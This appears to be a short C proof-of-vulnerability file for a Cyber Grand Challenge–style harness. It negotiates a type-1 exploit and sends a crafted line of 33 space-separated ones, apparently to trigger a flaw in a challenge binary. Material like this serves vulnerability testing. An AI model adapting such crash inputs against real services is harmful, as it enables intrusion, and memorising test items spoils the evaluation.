#include <libpov.h>
int main(void) {
   negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20"
         "\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20"
         "\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20"
         "\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20\x31\x20"
         "\x31\x0a";
      static unsigned int write_00000_00000_len = 66;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         transmit_all(1, write_00000, write_00000_len);
      }
      free(write_00000);
   } while (0);
}
